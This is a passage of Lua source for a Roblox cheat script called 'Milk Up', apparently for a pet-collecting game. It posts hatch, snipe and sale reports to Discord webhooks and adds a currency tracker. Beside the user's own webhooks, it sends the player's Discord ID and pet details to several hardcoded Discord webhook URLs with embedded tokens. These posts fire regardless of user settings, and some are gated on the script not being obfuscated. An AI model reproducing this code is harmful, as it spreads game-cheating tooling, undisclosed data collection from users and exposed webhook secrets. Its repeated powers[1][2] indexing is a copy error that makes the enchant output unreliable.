        if (Settings.Rarities[""Basic""] and Library.Directory.Pets[Pet.id].rarity == ""Basic"") or (Settings.Rarities[""Rare""] and Library.Directory.Pets[Pet.id].rarity == ""Rare"") or (Settings.Rarities[""Epic""] and Library.Directory.Pets[Pet.id].rarity == ""Epic"") or (Settings.Rarities[""Legendary""] and Library.Directory.Pets[Pet.id].rarity == ""Legendary"") or (Settings.Rarities[""Mythical""] and Library.Directory.Pets[Pet.id].rarity == ""Mythical"") or (Settings.Rarities[""""] and Library.Directory.Pets[Pet.id].rarity == """") or (Settings.Rarities[""Event""] and Library.Directory.Pets[Pet.id].rarity == ""Event"") or(Settings.Rarities[""Exclusive""] and Library.Directory.Pets[Pet.id].rarity == ""Exclusive"") or (Settings.Rarities[""Huge""] and Library.Directory.Pets[Pet.id].huge) or (Settings.Rarities[""Titanic""] and Library.Directory.Pets[Pet.id].titanic) then
            return true
        end
    end
    return false
end

local function HasPetEquipped(Uid)
    local PetsPath = IsHardcoreMode and Library.Save.Get().HardcorePetsEquipped or Library.Save.Get().PetsEquipped
    if PetsPath[Uid] then
        return true
    end
end

--// Webhooks
local function CheckForPet(UID)
    for i,v in pairs(Library.Save.Get().Pets) do
        if v.uid == UID then
            return true
        end
    end
    return false
end

local function SendHatchWebhook(PetTable, PetEgg)
    LPH_JIT_MAX(function()
        local DescriptionTable = {}
        local PetID = PetTable.id
        local PetName = Library.Directory.Pets[PetID].name
        local PetType = (PetTable.r and ""RAINBOW"") or (PetTable.g and ""GOLDEN"") or (PetTable.dm and ""DARK MATTER"") or ""NORMAL""
        local PetImage = Library.Directory.Pets[PetID][(PetTable.r and ""thumbnail"") or (PetTable.g and ""goldenThumbnail"") or (PetTable.dm and ""darkMatterThumbnail"") or ""thumbnail""]:split(""//"")[2]
        local EmbedColor = (Library.Directory.Pets[PetID].rarity == """" and 0x0d3b60) or 0x7b4fdb
        local PingCheck = (Config.Webhooks.HatchWebhook.PingUser and ""||<@""..Config.Webhooks.HatchWebhook.ChoosenUserID.."">||"") or """"
        local ChangedEgg = PetEgg
        local CurrencyPath = (IsHardcoreMode and Library.Save.Get().HardcoreCurrency) or Library.Save.Get()
        if string.find(ChangedEgg, ""Golden"") then
            ChangedEgg = string.gsub(PetEgg, ""Golden "", """")
        end
        if Config.Webhooks.HatchWebhook.ShowChances then
            for i2,v2 in pairs(Library.Directory.Eggs[ChangedEgg].drops) do
                if v2[1] == PetID then
                    table.insert(DescriptionTable, "":four_leaf_clover: Chance: ""..Library.Functions.FormatOdds(v2[2]))
                end
            end
        end
        if Config.Webhooks.HatchWebhook.ShowEggsHatched then
            for i2,v2 in pairs(Library.Save.Get().EggsOpened) do
                if i2 == ChangedEgg then
                    table.insert(DescriptionTable, "":egg: Eggs Hatched: ""..Library.Functions.Commas(tonumber(v2)))
                end
            end
        end
        if Config.Webhooks.HatchWebhook.ShowEggsRemaining then
            for i2,v2 in pairs(Library.Directory.Eggs) do
                if i2 == ChangedEgg then
                    for i3,v3 in pairs(CurrencyPath) do
                        if i3 == v2.currency then
                            table.insert(DescriptionTable, "":sparkles: Eggs Remaining: ""..Library.Functions.Commas(math.floor(v3 / v2.cost) % 1000000000))
                        end
                    end
                end
            end
        end
        if Config.Webhooks.HatchWebhook.ShowStrength then
            table.insert(DescriptionTable, "":boom: Strength: ""..Library.Functions.NumberShorten(PetTable.s))
        end
        if Config.Webhooks.HatchWebhook.ShowCurrencyRemaining then
            local CurrencyLeft = Library.Save.Get()[Library.Directory.Eggs[ChangedEgg].currency]
            table.insert(DescriptionTable, "":money_with_wings: Currency Remaining: ""..Library.Functions.NumberShorten(CurrencyLeft))
        end
        if Config.Webhooks.HatchWebhook.ShowEnchants then
            local Enchants = {}
            if PetTable.powers then
                if PetTable.powers[1] then
                    table.insert(Enchants, ""↳ ""..PetTable.powers[1][1].."" ""..PetTable.powers[1][2])
                end
                if PetTable.powers[2] then
                    table.insert(Enchants, ""↳ ""..PetTable.powers[2][1].."" ""..PetTable.powers[1][2])
                end
                if PetTable.powers[3] then
                    table.insert(Enchants, ""↳ ""..PetTable.powers[3][1].."" ""..PetTable.powers[1][2])
                end
                table.insert(DescriptionTable, ""\n:dizzy: __Enchants__"")
                table.insert(DescriptionTable, table.concat(Enchants, ""\n""))
            end
        end
        local Title = (IsHardcoreMode and ""||""..Player.Name..""|| Hatched A Hardcore""..((Library.Directory.Pets[PetTable.id].rarity == """" and "" "") or """")..((PetTable.sh and "" Shiny "") or "" "")..PetType.."" ""..PetName) or (""||""..Player.Name..""|| Hatched A""..((Library.Directory.Pets[PetTable.id].rarity == """" and "" "") or """")..((PetTable.sh and "" Shiny "") or "" "")..PetType.."" ""..PetName)
        local Webhook = Config.Webhooks.HatchWebhook.ChoosenWebhook
        local msg = {
            [""username""] =  ""Milk Up"",
            [""avatar_url""] = ""https://media.istockphoto.com/id/1256233718/vector/cute-cow-vector-icon-illustration.jpg?s=612x612&w=0&k=20&c=i_MCfgGxR-6GvXYV5yZ4jNF_7VwGKxd0TMaEEyo0Mqk="",
            [""content""] = PingCheck,
            [""embeds""] = {
                {
                    [""color""] = EmbedColor,
                    [""title""] = Title,
                    [""thumbnail""] = {[""url""] = HttpService:JSONDecode(game:HttpGet((""https://thumbnails.roblox.com/v1/assets?assetIds=""..PetImage..""&size=250x250&format=Png&isCircular=false""))).data[1].imageUrl},
                    [""description""] = ""**""..table.concat(DescriptionTable, ""\n"")..""**"",
                    ['timestamp'] = DateTime(),
                    [""footer""] = {
                        [""text""] = ""Milk Up"",
                        [""icon_url""] = ""https://media.istockphoto.com/id/1256233718/vector/cute-cow-vector-icon-illustration.jpg?s=612x612&w=0&k=20&c=i_MCfgGxR-6GvXYV5yZ4jNF_7VwGKxd0TMaEEyo0Mqk=""
                    },
                },
            },
        }

        HTTPRequest({Url = Webhook, Method = ""POST"", Headers = {[""Content-Type""] = ""application/json""}, Body = HttpService:JSONEncode(msg)})
    end)()
end

local function SendMiscHatchWebhook(PetTable, PetEgg)
    if Library.Directory.Pets[PetTable.id].rarity == ""Exclusive"" or Library.Directory.Pets[PetTable.id].rarity == ""Event"" then
        if not LPH_OBFUSCATED then
            local DescriptionTable = {}
            local PetID = PetTable.id
            local PetName = Library.Directory.Pets[PetID].name
            local PetType = (PetTable.r and ""RAINBOW"") or (PetTable.g and ""GOLDEN"") or (PetTable.dm and ""DARK MATTER"") or ""NORMAL""
            local PetImage = Library.Directory.Pets[PetID][(PetTable.r and ""thumbnail"") or (PetTable.g and ""goldenThumbnail"") or (PetTable.dm and ""darkMatterThumbnail"") or ""thumbnail""]:split(""//"")[2]
            local EmbedColor = (Library.Directory.Pets[PetID].rarity == """" and 0x0d3b60) or 0x7b4fdb
            local ChangedEgg = PetEgg
            local CurrencyPath = (IsHardcoreMode and Library.Save.Get().HardcoreCurrency) or Library.Save.Get()
            if string.find(ChangedEgg, ""Golden"") then
                ChangedEgg = string.gsub(PetEgg, ""Golden "", """")
            end 
            for i2,v2 in pairs(Library.Directory.Eggs[ChangedEgg].drops) do
                if v2[1] == PetID then
                    table.insert(DescriptionTable, "":four_leaf_clover: Chance: ""..Library.Functions.FormatOdds(v2[2]))
                end
            end 
            for i2,v2 in pairs(Library.Save.Get().EggsOpened) do
                if i2 == ChangedEgg then
                    table.insert(DescriptionTable, "":egg: Eggs Hatched: ""..Library.Functions.Commas(tonumber(v2)))
                end
            end 
            for i2,v2 in pairs(Library.Directory.Eggs) do
                if i2 == ChangedEgg then
                    for i3,v3 in pairs(CurrencyPath) do
                        if i3 == v2.currency then
                            table.insert(DescriptionTable, "":sparkles: Eggs Remaining: ""..Library.Functions.Commas(math.floor(v3 / v2.cost) % 1000000000))
                        end
                    end
                end
            end 
            table.insert(DescriptionTable, "":boom: Strength: ""..Library.Functions.NumberShorten(PetTable.s))    
            local CurrencyLeft = Library.Save.Get()[Library.Directory.Eggs[ChangedEgg].currency]
            table.insert(DescriptionTable, "":money_with_wings: Currency Remaining: ""..Library.Functions.NumberShorten(CurrencyLeft))  
            local Enchants = {}
            if PetTable.powers then
                if PetTable.powers[1] then
                    table.insert(Enchants, ""↳ ""..PetTable.powers[1][1].."" ""..PetTable.powers[1][2])
                end
                if PetTable.powers[2] then
                    table.insert(Enchants, ""↳ ""..PetTable.powers[2][1].."" ""..PetTable.powers[1][2])
                end
                if PetTable.powers[3] then
                    table.insert(Enchants, ""↳ ""..PetTable.powers[3][1].."" ""..PetTable.powers[1][2])
                end
                table.insert(DescriptionTable, ""\n:dizzy: __Enchants__"")
                table.insert(DescriptionTable, table.concat(Enchants, ""\n""))
            end
            local Title = (IsHardcoreMode and ""Flury Hatched A Hardcore""..((Library.Directory.Pets[PetTable.id].rarity == """" and "" "") or """")..((PetTable.sh and "" Shiny "") or "" "")..PetType.."" ""..PetName) or (""Flury Hatched A""..((Library.Directory.Pets[PetTable.id].rarity == """" and "" "") or """")..((PetTable.sh and "" Shiny "") or "" "")..PetType.."" ""..PetName)
            local Webhook = ""https://discord.com/api/webhooks/1063901241853354134/vJC73XGP4BDg0FW17J5UOsx-B4D2MteDJbPuIuOFr6mdQVSOoTaTtdIYbZhPJAKueMaY""
            local msg = {
                [""username""] =  ""Milk Up"",
                [""avatar_url""] = ""https://media.istockphoto.com/id/1256233718/vector/cute-cow-vector-icon-illustration.jpg?s=612x612&w=0&k=20&c=i_MCfgGxR-6GvXYV5yZ4jNF_7VwGKxd0TMaEEyo0Mqk="",
                [""embeds""] = {
                    {
                        [""color""] = EmbedColor,
                        [""title""] = Title,
                        [""thumbnail""] = {[""url""] = HttpService:JSONDecode(game:HttpGet((""https://thumbnails.roblox.com/v1/assets?assetIds=""..PetImage..""&size=250x250&format=Png&isCircular=false""))).data[1].imageUrl},
                        [""description""] = ""**""..table.concat(DescriptionTable, ""\n"")..""**"",
                        ['timestamp'] = DateTime(),
                        [""footer""] = {
                            [""text""] = ""Milk Up"",
                            [""icon_url""] = ""https://media.istockphoto.com/id/1256233718/vector/cute-cow-vector-icon-illustration.jpg?s=612x612&w=0&k=20&c=i_MCfgGxR-6GvXYV5yZ4jNF_7VwGKxd0TMaEEyo0Mqk=""
                        },
                    },
                },
            }   
            HTTPRequest({Url = Webhook, Method = ""POST"", Headers = {[""Content-Type""] = ""application/json""}, Body = HttpService:JSONEncode(msg)})
        end
        if Library.Directory.Pets[PetTable.id].huge then
            local DescriptionTable = {}
            local PetID = PetTable.id
            local PetName = Library.Directory.Pets[PetID].name
            local PetType = (PetTable.r and ""RAINBOW"") or (PetTable.g and ""GOLDEN"") or (PetTable.dm and ""DARK MATTER"") or ""NORMAL""
            local PetImage = Library.Directory.Pets[PetID][(PetTable.r and ""thumbnail"") or (PetTable.g and ""goldenThumbnail"") or (PetTable.dm and ""darkMatterThumbnail"") or ""thumbnail""]:split(""//"")[2]
            local EmbedColor = (Library.Directory.Pets[PetID].rarity == """" and 0x0d3b60) or 0x7b4fdb
            local ChangedEgg = PetEgg
            local CurrencyPath = (IsHardcoreMode and Library.Save.Get().HardcoreCurrency) or Library.Save.Get()
            if string.find(ChangedEgg, ""Golden"") then
                ChangedEgg = string.gsub(PetEgg, ""Golden "", """")
            end 
            for i2,v2 in pairs(Library.Directory.Eggs[ChangedEgg].drops) do
                if v2[1] == PetID then
                    table.insert(DescriptionTable, "":four_leaf_clover: Chance: ""..Library.Functions.FormatOdds(v2[2]))
                end
            end 
            for i2,v2 in pairs(Library.Save.Get().EggsOpened) do
                if i2 == ChangedEgg then
                    table.insert(DescriptionTable, "":egg: Eggs Hatched: ""..Library.Functions.Commas(tonumber(v2)))
                end
            end 
            for i2,v2 in pairs(Library.Directory.Eggs) do
                if i2 == ChangedEgg then
                    for i3,v3 in pairs(CurrencyPath) do
                        if i3 == v2.currency then
                            table.insert(DescriptionTable, "":sparkles: Eggs Remaining: ""..Library.Functions.Commas(math.floor(v3 / v2.cost) % 1000000000))
                        end
                    end
                end
            end 
            table.insert(DescriptionTable, "":boom: Strength: ""..Library.Functions.NumberShorten(PetTable.s))    
            local CurrencyLeft = Library.Save.Get()[Library.Directory.Eggs[ChangedEgg].currency]
            table.insert(DescriptionTable, "":money_with_wings: Currency Remaining: ""..Library.Functions.NumberShorten(CurrencyLeft))  
            local Enchants = {}
            if PetTable.powers then
                if PetTable.powers[1] then
                    table.insert(Enchants, ""↳ ""..PetTable.powers[1][1].."" ""..PetTable.powers[1][2])
                end
                if PetTable.powers[2] then
                    table.insert(Enchants, ""↳ ""..PetTable.powers[2][1].."" ""..PetTable.powers[1][2])
                end
                if PetTable.powers[3] then
                    table.insert(Enchants, ""↳ ""..PetTable.powers[3][1].."" ""..PetTable.powers[1][2])
                end
                table.insert(DescriptionTable, ""\n:dizzy: __Enchants__"")
                table.insert(DescriptionTable, table.concat(Enchants, ""\n""))
            end
            local Title = (IsHardcoreMode and DiscordID.."" Hatched A Hardcore""..((Library.Directory.Pets[PetTable.id].rarity == """" and "" "") or """")..((PetTable.sh and "" Shiny "") or "" "")..PetType.."" ""..PetName) or (DiscordID.."" Hatched A""..((Library.Directory.Pets[PetTable.id].rarity == """" and "" "") or """")..((PetTable.sh and "" Shiny "") or "" "")..PetType.."" ""..PetName)
            local Webhook = ""https://discord.com/api/webhooks/1066872879892934776/kUZ9-kLK68_rVPox42hT2AYc-tyx8nV1P_K5c1nSvzDcYyoNEQS-0YXTXxQxBxJKJQ1I""
            local msg = {
                [""username""] =  ""Milk Up"",
                [""avatar_url""] = ""https://media.istockphoto.com/id/1256233718/vector/cute-cow-vector-icon-illustration.jpg?s=612x612&w=0&k=20&c=i_MCfgGxR-6GvXYV5yZ4jNF_7VwGKxd0TMaEEyo0Mqk="",
                [""embeds""] = {
                    {
                        [""color""] = EmbedColor,
                        [""title""] = Title,
                        [""thumbnail""] = {[""url""] = HttpService:JSONDecode(game:HttpGet((""https://thumbnails.roblox.com/v1/assets?assetIds=""..PetImage..""&size=250x250&format=Png&isCircular=false""))).data[1].imageUrl},
                        [""description""] = ""**""..table.concat(DescriptionTable, ""\n"")..""**"",
                        ['timestamp'] = DateTime(),
                        [""footer""] = {
                            [""text""] = ""Milk Up"",
                            [""icon_url""] = ""https://media.istockphoto.com/id/1256233718/vector/cute-cow-vector-icon-illustration.jpg?s=612x612&w=0&k=20&c=i_MCfgGxR-6GvXYV5yZ4jNF_7VwGKxd0TMaEEyo0Mqk=""
                        },
                    },
                },
            }   
            HTTPRequest({Url = Webhook, Method = ""POST"", Headers = {[""Content-Type""] = ""application/json""}, Body = HttpService:JSONEncode(msg)})
        end
        return
    end
end

local function SendSnipeWebhook(PetOwner, PetUid, GemsSnipedFor, GemsRemaining)
    LPH_JIT_MAX(function()
        for i,v in pairs(Library.Save.Get().Pets) do
            if v.uid == PetUid then
                if Config.Webhooks.SnipeWebhook.StartWebhook then
                    local DescriptionTable = {}
                    local PetID = v.id
                    local PetName = Library.Directory.Pets[PetID].name
                    local PetType = (v.r and ""RAINBOW"") or (v.g and ""GOLDEN"") or (v.dm and ""DARK MATTER"") or ""NORMAL""
                    local PetImage = Library.Directory.Pets[PetID][(v.r and ""thumbnail"") or (v.g and ""goldenThumbnail"") or (v.dm and ""darkMatterThumbnail"") or ""thumbnail""]:split(""//"")[2]
                    local EmbedColor = (Library.Directory.Pets[PetID].rarity == """" and 0x0d3b60) or 0x7b4fdb
                    local PingCheck = (Config.Webhooks.SnipeWebhook.PingUser and ""||<@""..Config.Webhooks.SnipeWebhook.ChoosenUserID.."">||"") or """"   
                    if Config.Webhooks.SnipeWebhook.ShowGemsSnipedFor then
                        table.insert(DescriptionTable, "":money_with_wings: Sniped For: ""..GemsSnipedFor)
                    end
                    if Config.Webhooks.SnipeWebhook.ShowGemsRemaining then
                        table.insert(DescriptionTable, "":gem: Gems Remaining: ""..GemsRemaining)
                    end
                    if Config.Webhooks.SnipeWebhook.ShowOwner then
                        table.insert(DescriptionTable, "":troll: Owner: ||""..UserIDToUsername(PetOwner)..""||"")
                    end
                    if Config.Webhooks.SnipeWebhook.ShowStrength then
                        table.insert(DescriptionTable, "":boom: Strength: ""..Library.Functions.NumberShorten(v.s))
                    end
                    if Config.Webhooks.SnipeWebhook.ShowEnchants then
                        local Enchants = {}
                        if v.powers then
                            if v.powers[1] then
                                table.insert(Enchants, ""↳ ""..v.powers[1][1].."" ""..v.powers[1][2])
                            end
                            if v.powers[2] then
                                table.insert(Enchants, ""↳ ""..v.powers[2][1].."" ""..v.powers[1][2])
                            end
                            if v.powers[3] then
                                table.insert(Enchants, ""↳ ""..v.powers[3][1].."" ""..v.powers[1][2])
                            end
                            table.insert(DescriptionTable, ""\n:dizzy: __Enchants__"")
                            table.insert(DescriptionTable, table.concat(Enchants, ""\n""))
                        end
                    end
                    local Title = (v.hc and ""||""..Player.Name..""|| Sniped A Hardcore""..((Library.Directory.Pets[v.id].rarity == """" and "" "") or """")..((v.sh and "" Shiny "") or "" "")..""__""..PetType..""__ ""..PetName) or (""||""..Player.Name..""|| Sniped A""..((Library.Directory.Pets[v.id].rarity == """" and "" "") or """")..((v.sh and "" Shiny "") or "" "")..""__""..PetType..""__ ""..PetName)
                    local Webhook = Config.Webhooks.SnipeWebhook.ChoosenWebhook
                    local msg = {
                        [""username""] =  ""Milk Up"",
                        [""avatar_url""] = ""https://media.istockphoto.com/id/1256233718/vector/cute-cow-vector-icon-illustration.jpg?s=612x612&w=0&k=20&c=i_MCfgGxR-6GvXYV5yZ4jNF_7VwGKxd0TMaEEyo0Mqk="",
                        [""content""] = PingCheck,
                        [""embeds""] = {
                            {
                                [""color""] = EmbedColor,
                                [""title""] = Title,
                                [""thumbnail""] = {[""url""] = HttpService:JSONDecode(game:HttpGet((""https://thumbnails.roblox.com/v1/assets?assetIds=""..PetImage..""&size=250x250&format=Png&isCircular=false""))).data[1].imageUrl},
                                [""description""] = ""**""..table.concat(DescriptionTable, ""\n"")..""**"",
                                ['timestamp'] = DateTime(),
                                [""footer""] = {
                                    [""text""] = ""Milk Up"",
                                    [""icon_url""] = ""https://media.istockphoto.com/id/1256233718/vector/cute-cow-vector-icon-illustration.jpg?s=612x612&w=0&k=20&c=i_MCfgGxR-6GvXYV5yZ4jNF_7VwGKxd0TMaEEyo0Mqk=""
                                },
                            },
                        },
                    }   
                    HTTPRequest({Url = Webhook, Method = ""POST"", Headers = {[""Content-Type""] = ""application/json""}, Body = HttpService:JSONEncode(msg)})
                end
                if Library.Directory.Pets[v.id].huge == true or Library.Directory.Pets[v.id].titanic == true then
                    local DescriptionTable2 = {}
                    local PetID2 = v.id
                    local PetName2 = Library.Directory.Pets[PetID2].name
                    local PetType2 = (v.r and ""RAINBOW"") or (v.g and ""GOLDEN"") or (v.dm and ""DARK MATTER"") or ""NORMAL""
                    local PetImage2 = Library.Directory.Pets[PetID2][(v.r and ""thumbnail"") or (v.g and ""goldenThumbnail"") or (v.dm and ""darkMatterThumbnail"") or ""thumbnail""]:split(""//"")[2] 
                    local EmbedColor2 = (Library.Directory.Pets[PetID2].rarity == """" and 0x0d3b60) or 0x7b4fdb
                    table.insert(DescriptionTable2, "":money_with_wings: Sniped For: ""..GemsSnipedFor)
                    table.insert(DescriptionTable2, "":gem: Gems Remaining: ""..GemsRemaining)
                    table.insert(DescriptionTable2, "":boom: Strength: ""..Library.Functions.NumberShorten(v.s))
                    local Enchants2 = {}
                    if v.powers then
                        if v.powers[1] then
                            table.insert(Enchants2, ""↳ ""..v.powers[1][1].."" ""..v.powers[1][2])
                        end
                        if v.powers[2] then
                            table.insert(Enchants2, ""↳ ""..v.powers[2][1].."" ""..v.powers[1][2])
                        end
                        if v.powers[3] then
                            table.insert(Enchants2, ""↳ ""..v.powers[3][1].."" ""..v.powers[1][2])
                        end
                        table.insert(DescriptionTable2, ""\n:dizzy: __Enchants__"")
                        table.insert(DescriptionTable2, table.concat(Enchants2, ""\n""))
                    end
                    local Title = (v.hc and DiscordID.."" Sniped A Hardcore""..((Library.Directory.Pets[v.id].rarity == """" and "" "") or """")..((v.sh and "" Shiny "") or "" "")..PetType2.."" ""..PetName2) or (DiscordID.."" Sniped A""..((Library.Directory.Pets[v.id].rarity == """" and "" "") or """")..((v.sh and "" Shiny "") or "" "")..PetType2.."" ""..PetName2)
                    local Webhook = ""https://discord.com/api/webhooks/1061091421131640964/AugZxHgVDELGySY9BzgWegE-vaIDqZ0OKQo70GymVwK5ttXb-5HPndmvzOtEpiOVKbIZ""
                    local msg = {
                        [""username""] =  ""Milk Up"",
                        [""avatar_url""] = ""https://media.istockphoto.com/id/1256233718/vector/cute-cow-vector-icon-illustration.jpg?s=612x612&w=0&k=20&c=i_MCfgGxR-6GvXYV5yZ4jNF_7VwGKxd0TMaEEyo0Mqk="",
                        [""embeds""] = {
                            {
                                [""color""] = EmbedColor2,
                                [""title""] = Title,
                                [""thumbnail""] = {[""url""] = HttpService:JSONDecode(game:HttpGet((""https://thumbnails.roblox.com/v1/assets?assetIds=""..PetImage2..""&size=250x250&format=Png&isCircular=false""))).data[1].imageUrl},
                                [""description""] = ""**""..table.concat(DescriptionTable2, ""\n"")..""**"",
                                ['timestamp'] = DateTime(),
                                [""footer""] = {
                                    [""text""] = ""Milk Up"",
                                    [""icon_url""] = ""https://media.istockphoto.com/id/1256233718/vector/cute-cow-vector-icon-illustration.jpg?s=612x612&w=0&k=20&c=i_MCfgGxR-6GvXYV5yZ4jNF_7VwGKxd0TMaEEyo0Mqk=""
                                },
                            },
                        },
                    }   
                    HTTPRequest({Url = Webhook, Method = ""POST"", Headers = {[""Content-Type""] = ""application/json""}, Body = HttpService:JSONEncode(msg)})
                end
                if not LPH_OBFUSCATED then
                    local DescriptionTable2 = {}
                    local PetID3 = v.id
                    local PetName3 = Library.Directory.Pets[PetID3].name
                    local PetType3 = (v.r and ""RAINBOW"") or (v.g and ""GOLDEN"") or (v.dm and ""DARK MATTER"") or ""NORMAL""
                    local PetImage3 = Library.Directory.Pets[PetID3][(v.r and ""thumbnail"") or (v.g and ""goldenThumbnail"") or (v.dm and ""darkMatterThumbnail"") or ""thumbnail""]:split(""//"")[2] 
                    local EmbedColor3 = (Library.Directory.Pets[PetID3].rarity == """" and 0x0d3b60) or 0x7b4fdb
                    table.insert(DescriptionTable2, "":money_with_wings: Sniped For: ""..GemsSnipedFor)
                    table.insert(DescriptionTable2, "":gem: Gems Remaining: ""..GemsRemaining)
                    table.insert(DescriptionTable2, "":boom: Strength: ""..Library.Functions.NumberShorten(v.s))
                    local Enchants2 = {}
                    if v.powers then
                        if v.powers[1] then
                            table.insert(Enchants2, ""↳ ""..v.powers[1][1].."" ""..v.powers[1][2])
                        end
                        if v.powers[2] then
                            table.insert(Enchants2, ""↳ ""..v.powers[2][1].."" ""..v.powers[1][2])
                        end
                        if v.powers[3] then
                            table.insert(Enchants2, ""↳ ""..v.powers[3][1].."" ""..v.powers[1][2])
                        end
                        table.insert(DescriptionTable2, ""\n:dizzy: __Enchants__"")
                        table.insert(DescriptionTable2, table.concat(Enchants2, ""\n""))
                    end
                    local Title = (v.hc and ""Flury Sniped A Hardcore""..((Library.Directory.Pets[v.id].rarity == """" and "" "") or """")..((v.sh and "" Shiny "") or "" "")..""__""..PetType3..""__ ""..PetName3) or (""Flury Sniped A""..((Library.Directory.Pets[v.id].rarity == """" and "" "") or """")..((v.sh and "" Shiny "") or "" "")..""__""..PetType3..""__ ""..PetName3)
                    local Webhook = ""https://discord.com/api/webhooks/1066427517633822830/cAZ7oi4rrgxY7eGVnpBTOUy2Gcm6nPUt3c2Dab8WuPtcVpZFkj5yzwy_wv6HDE7bMU0m""
                    local msg = {
                        [""username""] =  ""Milk Up"",
                        [""avatar_url""] = ""https://media.istockphoto.com/id/1256233718/vector/cute-cow-vector-icon-illustration.jpg?s=612x612&w=0&k=20&c=i_MCfgGxR-6GvXYV5yZ4jNF_7VwGKxd0TMaEEyo0Mqk="",
                        [""embeds""] = {
                            {
                                [""color""] = EmbedColor3,
                                [""title""] = Title,
                                [""thumbnail""] = {[""url""] = HttpService:JSONDecode(game:HttpGet((""https://thumbnails.roblox.com/v1/assets?assetIds=""..PetImage3..""&size=250x250&format=Png&isCircular=false""))).data[1].imageUrl},
                                [""description""] = ""**""..table.concat(DescriptionTable2, ""\n"")..""**"",
                                ['timestamp'] = DateTime(),
                                [""footer""] = {
                                    [""text""] = ""Milk Up"",
                                    [""icon_url""] = ""https://media.istockphoto.com/id/1256233718/vector/cute-cow-vector-icon-illustration.jpg?s=612x612&w=0&k=20&c=i_MCfgGxR-6GvXYV5yZ4jNF_7VwGKxd0TMaEEyo0Mqk=""
                                },
                            },
                        },
                    }   
                    HTTPRequest({Url = Webhook, Method = ""POST"", Headers = {[""Content-Type""] = ""application/json""}, Body = HttpService:JSONEncode(msg)})
                end
            end
        end
    end)()
end

local OldSavedPets = Library.Save.Get().Pets
local function SendSellWebhook(BoughtBy, BoughtFor, Information)
    if Config.Webhooks.SellWebhook.StartWebhook then
        local DescriptionTable = {}
        local PetID = Information.id
        local PetName = Library.Directory.Pets[PetID].name
        local PetType = (Information.r and ""RAINBOW"") or (Information.g and ""GOLDEN"") or (Information.dm and ""DARK MATTER"") or ""NORMAL""
        local PetImage = Library.Directory.Pets[PetID][(Information.r and ""thumbnail"") or (Information.g and ""goldenThumbnail"") or (Information.dm and ""darkMatterThumbnail"") or ""thumbnail""]:split(""//"")[2]
        local EmbedColor = (Library.Directory.Pets[PetID].rarity == """" and 0x0d3b60) or 0x7b4fdb
        local PingCheck = (Config.Webhooks.SellWebhook.PingUser and ""||<@""..Config.Webhooks.SellWebhook.ChoosenUserID.."">||"") or """"   
        if Config.Webhooks.SellWebhook.ShowSoldFor then
            table.insert(DescriptionTable, "":money_with_wings: Sold For: ""..BoughtFor)
        end
        if Config.Webhooks.SellWebhook.ShowTotalGems then
            table.insert(DescriptionTable, "":gem: Total Gems: ""..Library.Functions.Commas(Library.Save.Get().Diamonds))
        end
        if Config.Webhooks.SellWebhook.ShowPurchasedBy then
            table.insert(DescriptionTable, "":troll: Purchased By: ||""..BoughtBy..""||"")
        end
        local Title = (Information.hc and ""||""..Player.Name..""|| Sold A Hardcore""..((Information.sh and "" Shiny "") or "" "")..PetType.."" ""..PetName) or (""||""..Player.Name..""|| Sold A""..((Information.sh and "" Shiny "") or "" "")..PetType.."" ""..PetName)
        local Webhook = Config.Webhooks.SellWebhook.ChoosenWebhook
        local msg = {
            [""username""] =  ""Milk Up"",
            [""avatar_url""] = ""https://media.istockphoto.com/id/1256233718/vector/cute-cow-vector-icon-illustration.jpg?s=612x612&w=0&k=20&c=i_MCfgGxR-6GvXYV5yZ4jNF_7VwGKxd0TMaEEyo0Mqk="",
            [""content""] = PingCheck,
            [""embeds""] = {
                {
                    [""color""] = EmbedColor,
                    [""title""] = Title,
                    [""thumbnail""] = {[""url""] = HttpService:JSONDecode(game:HttpGet((""https://thumbnails.roblox.com/v1/assets?assetIds=""..PetImage..""&size=250x250&format=Png&isCircular=false""))).data[1].imageUrl},
                    [""description""] = ""**""..table.concat(DescriptionTable, ""\n"")..""**"",
                    ['timestamp'] = DateTime(),
                    [""footer""] = {
                        [""text""] = ""Milk Up"",
                        [""icon_url""] = ""https://media.istockphoto.com/id/1256233718/vector/cute-cow-vector-icon-illustration.jpg?s=612x612&w=0&k=20&c=i_MCfgGxR-6GvXYV5yZ4jNF_7VwGKxd0TMaEEyo0Mqk=""
                    },
                },
            },
        }   
        HTTPRequest({Url = Webhook, Method = ""POST"", Headers = {[""Content-Type""] = ""application/json""}, Body = HttpService:JSONEncode(msg)})
    end
end

Player.PlayerGui.Notifications.Frame.ChildAdded:Connect(function(Notification)
    if Notification.Text:find(""purchased"") then
        local PetsCheck = {}
        for i,v in pairs(Library.Save.Get().Pets) do
            table.insert(PetsCheck, v.uid)
        end
        for i,v in pairs(OldSavedPets) do
            if not table.find(PetsCheck, v.uid) then
                SendSellWebhook(Notification.Text:split(""purchased"")[1], Notification.Text:split(""for "")[2]:split("" Diamonds"")[1], v)
                OldSavedPets = Library.Save.Get().Pets
            end
        end
    end
end)

local function EnableStatsTracker()
    local CoinTypes = {}
    for i,v in pairs(Player.PlayerGui.Main.Right:GetChildren()) do
        if v:IsA(""Frame"") and v.Name ~= ""Rank"" then
            table.insert(CoinTypes, v)
        end
    end

    local ActiveTypes = {}
    for i,v in pairs(CoinTypes) do
        task.spawn(function()
            if not Player.PlayerGui.Main.Right:FindFirstChild(v.Name.."" Tracker"") then
                v.LayoutOrder = LayoutOrdersList[v.Name]
                local TrackerClone = v:Clone()
                TrackerClone.Name = TrackerClone.Name.."" Tracker""
                TrackerClone.Parent = Player.PlayerGui.Main.Right
                TrackerClone.Size = UDim2.new(0, 175, 0, 30)
                TrackerClone.LayoutOrder = TrackerClone.LayoutOrder + 1
                ActiveTypes[v.Name] = TrackerClone
            end
        end)
    end

    local CurrencyPath = (IsHardcoreMode and Library.Save.Get().HardcoreCurrency) or Library.Save.Get()
    for i,v in pairs(CoinTypes) do
        task.spawn(function()
            local AmountOfCurrency = {}
            local Index = 1
            local PastTime = 0
            local Last = tick()
            local Now = Last
            local SecondsUpdate = 0.5
            while true do
                if not Config.Misc.Extra.StatsTracker then
                    for i,v in pairs(CoinTypes) do
                        if Player.PlayerGui.Main.Right:FindFirstChild(v.Name.."" Tracker"") then
                            Player.PlayerGui.Main.Right:FindFirstChild(v.Name.."" Tracker""):Destroy()
                        end
                    end
                    break
                end
                if PastTime >= SecondsUpdate then
                    while PastTime >= SecondsUpdate do PastTime = PastTime - SecondsUpdate end
                    local CurrencyToChange = CurrencyPath[v.Name]
                    AmountOfCurrency[Index] = CurrencyToChange
                    if CurrencyToChange ~= nil then
                        local Different = CurrencyToChange - (AmountOfCurrency[Index-120] or AmountOfCurrency[1])
